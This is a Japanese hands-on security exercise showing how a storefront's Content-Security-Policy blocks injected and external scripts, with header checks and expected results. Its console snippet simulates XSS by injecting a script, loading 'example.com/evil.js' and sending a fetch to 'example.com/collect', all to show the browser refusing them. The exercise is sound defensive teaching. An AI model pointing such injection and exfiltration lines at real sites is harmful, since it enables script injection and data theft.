---
title: セキュリティ-3 CSP で外部スクリプトを止める
---

# セキュリティ-3 CSP で外部スクリプトを止める

::: info この演習について
- 所要時間: 約 15 分
- 使うもの: 軽量版(docker compose)。`curl`、ブラウザの開発者ツール(コンソール)
- 仕組みはこちら: [仕組み-1 cdn-waf(CDN と WAF)](/how-it-works/01-cdn-waf)・[仕組み-4 storefront の SSR](/how-it-works/04-storefront-ssr)
- 関係する設計書: [セキュリティ方式](/design/architecture/10-security)・[D-SEC-01 WAF とレート制限](/design/detail/D-SEC-01-waf-and-rate-limit)
- 用語集: [CSP](/guide/glossary#csp)・[XSS](/guide/glossary#xss)・[セキュリティヘッダ](/guide/glossary#security-headers)
:::

## 1. この設計書はなぜ必要か

万が一、画面に外部のスクリプトが差し込まれても(XSS)、ブラウザに「動かしてよいスクリプトの名簿」を渡しておけば、名簿に無いスクリプトは動きません。被害を最後の一歩で止められます。

> **よくある事故**: 口コミ欄に、あるお客様がスクリプトの入った文字列を書き込みました。アプリがそれをそのまま画面に出したため、
> その口コミを見た全員のブラウザで、ログインの情報が外部の罠のサイトに送られました。差し込みの不具合と、外部送信を止める仕組みの、両方が欠けていました。

「読み込んでよいスクリプト・通信してよい宛先」を宣言する CSP を、セキュリティの方式設計書で決めます。

## 2. 何をやっているのか

サンプルストアの入口 cdn-waf は、お店の画面(www)の応答に `Content-Security-Policy`(CSP)ヘッダを付けています(値は `docker-compose.yml` の `WWW_CSP`)。主な中身は次のとおりです。

| 書いてあること | 意味 |
| --- | --- |
| `script-src 'self' 'sha256-…'` | スクリプトは、このサイトの JS ファイルと、指紋(sha256)が一致する埋め込みスクリプトだけ |
| `connect-src 'self' http://api.lab.localhost:18080` | JS が通信してよいのは、このサイトと api だけ |
| `img-src 'self' data: http://api.lab.localhost:18080` | 画像は、このサイト・埋め込み・api の `/medias/` だけ |
| `object-src 'none'`・`base-uri 'self'`・`form-action 'self'` | 古いプラグイン・基準 URL の書き換え・よそへのフォーム送信を禁止 |
| `frame-ancestors 'none'` | よそのサイトの枠(iframe)の中に表示させない |

`connect-src` と `img-src` に api の住所があるのは、ブラウザが **別オリジンの api** から JSON と商品画像を取るためです(第 2 版で画面と api を別オリジンにしたので、ここに api を書き足しています)。
演習では、お店の画面の上で、開発者ツールから「差し込まれたスクリプト」「外部のスクリプト」「外部への送信」の 3 つをわざと試し、ブラウザが止める様子を見ます。比べるために、CSP を付けていないラボの画面(pager)でも同じことを試します。

たとえ: **CSP は「この家に入ってよい業者の名簿」を玄関に貼っておくこと** です。名簿に無い人は、たとえ家の中の誰かが招き入れても(スクリプトが差し込まれても)、家の人(ブラウザ)が追い返します。
名簿に無い宛先への荷物の発送(外部への送信)も断ります。

::: tip CCv2 では
CSP は、CDN や storefront のヘッダで設定します。「自分のサイトの JS と、指紋の合う埋め込みスクリプトだけ許す」形は、Angular ベースの storefront でよく使われます。
Angular を更新すると埋め込みスクリプトの指紋が変わることがあり、そのときは新しい指紋を CSP に足します(やり方は README の「CSP の指紋」)。
:::

## 3. まず触ってみる

1. **ヘッダを見る**。ホストごとに CSP が違います(api は「何も読み込ませない」いちばん厳しい形)。

   ```bash
   curl -sI http://www.lab.localhost:18080/ | grep -iE 'content-security|x-frame|x-content|referrer'
   echo '--- api ---'; curl -sI http://api.lab.localhost:18080/occ/v2/samplestore/products/100001 | grep -i content-security
   ```

2. **お店の画面で試す**。http://www.lab.localhost:18080/ を開き、開発者ツール(F12、Mac は option+command+I)の「コンソール」に次を貼ります。
   Chrome で初めてコンソールに貼ると、貼り付けについての警告が出て、貼れないことがあります。そのときは、コンソールに `allow pasting`(Chrome の表示が日本語なら `貼り付けを許可`)と手で打って Enter を押してから、もう一度貼ります。
   中身は無害です(変数に印を付けるだけのスクリプト、存在しない外部のスクリプト、`example.com` への送信、そして許された api への送信)。

   ```js
   const v = [];
   document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective + ' blocked=' + (e.blockedURI || 'inline')));
   window.__ran = 'no';
   const s1 = document.createElement('script'); s1.textContent = "window.__ran = 'yes'"; document.body.appendChild(s1);
   const s2 = document.createElement('script'); s2.src = 'https://example.com/evil.js'; document.body.appendChild(s2);
   let f; try { await fetch('https://example.com/collect'); f = 'evil ok'; } catch (e) { f = 'evil ' + e; }
   let g; try { const r = await fetch('http://api.lab.localhost:18080/occ/v2/samplestore/products/100003'); g = 'api ' + r.status; } catch (e) { g = 'api ' + e; }
   await new Promise(r => setTimeout(r, 500));
   ({ inlineRan: window.__ran, evilFetch: f, apiFetch: g, violations: v })
   ```

   コンソールには、止めた理由を知らせる赤い文字も出ます。

3. **CSP の無い画面で比べる**。pager(http://localhost:19094)を開き、コンソールに次を貼ります。

   ```js
   window.__ran = 'no'; const s = document.createElement('script'); s.textContent = "window.__ran = 'yes'"; document.body.appendChild(s); window.__ran
   ```

4. **設定を読む**。`docker-compose.yml` の `WWW_CSP` のコメントを読みます。Angular が HTML に埋め込むスクリプトだけを指紋(sha256)で許していて、Angular を更新して指紋が変わったら足す、と書いてあります。

## 4. 何が見えたら成功か

**手順 1**: お店(www)には 4 つのセキュリティヘッダが付き、api は「何も読み込ませない」CSP です。

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-hashes' 'sha256-…' …; style-src 'self' 'unsafe-inline'; img-src 'self' data: http://api.lab.localhost:18080; font-src 'self' data:; connect-src 'self' http://api.lab.localhost:18080; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY
--- api ---
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
```

**手順 2**: 差し込んだスクリプトは動かず(`inlineRan: "no"`)、外部のスクリプトは読み込まれず、外部(example.com)への送信は失敗。一方、名簿に載っている api への送信は成功します。

```text
{
  "inlineRan": "no",
  "evilFetch": "evil TypeError: Failed to fetch",
  "apiFetch": "api 200",
  "violations": [
    "script-src-elem blocked=inline",
    "script-src-elem blocked=https://example.com/evil.js",
    "connect-src blocked=https://example.com/collect"
  ]
}
```

`connect-src` に api を書き足しているので、`example.com`(名簿に無い)は止まり、api(名簿にある)は通る、という差がはっきり出ます。

**手順 3**: CSP の無い pager では、同じ差し込みスクリプトがそのまま動きます。

```text
'yes'
```

CSP があっても、差し込まれる不具合(入力をそのまま HTML にする)そのものは直りません。CSP は **差し込まれても動かさない・外に送らせない** ための最後の壁です。

## 5. ここで覚える言葉

| 言葉 | 一言でいうと | たとえ | この演習で見たもの |
| --- | --- | --- | --- |
| [CSP](/guide/glossary#csp) | 読み込んでよいスクリプト・通信先を宣言するヘッダ | 家に入ってよい業者の名簿 | 差し込みが動かず、example.com が止まる |
| [XSS](/guide/glossary#xss) | 画面にスクリプトを差し込む攻撃 | 口コミ欄に仕込む | CSP が無い pager では動く |
| [セキュリティヘッダ](/guide/glossary#security-headers) | ブラウザに守り方を伝えるヘッダの総称 | 玄関に貼る注意書き | CSP・X-Frame-Options など 4 つ |
| 指紋(sha256) | 中身から作る、その物だけの合言葉 | 封印のスタンプ | 埋め込みスクリプトを指紋で許す |
| 別オリジンの許可 | 名簿に api の住所を書き足す | 出入り業者に api を追加 | `connect-src` に api がある |
| 多層防御 | 1 つの壁が破られても次の壁で止める | 鍵と警報の両方 | 差し込みを直す + CSP で動かさない |

## 6. 設計書ではここに書く

- **[セキュリティ方式 4.5 セキュリティヘッダと CSP](/design/architecture/10-security#s4-5)**: どのヘッダを付けるか、CSP の中身(script-src・connect-src・img-src)、別オリジンの api を許すこと、指紋の更新の運用。
- **[D-SEC-01 4.4 セキュリティヘッダ](/design/detail/D-SEC-01-waf-and-rate-limit#s4-4)**: ホストごとの CSP の値(www・api・backoffice)。
- **[ネットワーク方式 4.5 CORS](/design/architecture/04-network#s4-5)**: CSP(ブラウザが「どこへ通信してよいか」)と CORS(api が「どこに読ませてよいか」)の役割の違い。

## 7. レビューで聞く質問

- 「画面に CSP は付いていますか。`script-src` は、どのスクリプトを許していますか。`unsafe-inline` で全部許していませんか。」
- 「JS が通信してよい宛先(`connect-src`)は絞られていますか。別オリジンの api を許すとき、住所を 1 つずつ書いていますか。」
- 「XSS(差し込み)そのものを防ぐ対策(入力をそのまま HTML にしない)と、CSP の両方がありますか。」
- 「Angular などの更新で埋め込みスクリプトの指紋が変わったとき、誰がどう CSP を更新しますか。」
- 「よそのサイトの枠(iframe)に自分の画面を埋め込ませない設定(`frame-ancestors 'none'`)は入っていますか。」

## 8. 片付け

この演習では設定を変えていません。ブラウザのコンソールで試したことも、ページを閉じれば消えます。

```bash
curl -sI http://www.lab.localhost:18080/ | grep -i content-security   # CSP が付いていればよい
```
